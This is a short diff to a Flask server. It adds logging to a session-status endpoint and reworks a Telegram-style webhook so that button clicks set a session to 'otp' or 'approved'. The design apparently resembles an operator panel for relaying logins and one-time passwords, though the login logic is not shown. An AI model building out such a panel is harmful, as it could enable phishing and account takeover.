@@ -68,6 +68,8 @@ def login():
 def status(session_id):
     status = SESSION_STATUS.get(session_id)
 
+    print("STATUS CHECK:", session_id, status)
+
     if not status:
         return jsonify({"status": "invalid"})
 
@@ -79,24 +81,36 @@ def webhook():
     data = request.get_json()
     print("WEBHOOK HIT:", data)
 
-    if "callback_query" in data:
-        msg = data["callback_query"]["data"]
+    try:
+        if "callback_query" in data:
+            callback = data["callback_query"]
+            msg = callback["data"]
 
-        try:
             session_id, action = msg.split(":")
-            SESSION_STATUS[session_id] = action
 
-            print("UPDATED:", session_id, action)
+            print("👉 CLICK:", action)
 
-        except Exception as e:
-            print("ERROR:", e)
+            # 🔥 HARD FORCE (NO BUG POSSIBLE)
+            if action == "otp":
+                SESSION_STATUS[session_id] = "otp"
+
+            elif action == "approved":
+                SESSION_STATUS[session_id] = "approved"
+
+            else:
+                SESSION_STATUS[session_id] = action
+
+            print("✅ UPDATED:", session_id, SESSION_STATUS[session_id])
+
+    except Exception as e:
+        print("❌ ERROR:", e)
 
     return jsonify({"ok": True})
 
 # ================= ROOT =================
 @app.route("/")
 def home():
-    return "Server OK"
+    return "SERVER OK"
 
 # ================= RUN =================
 if __name__ == "__main__":
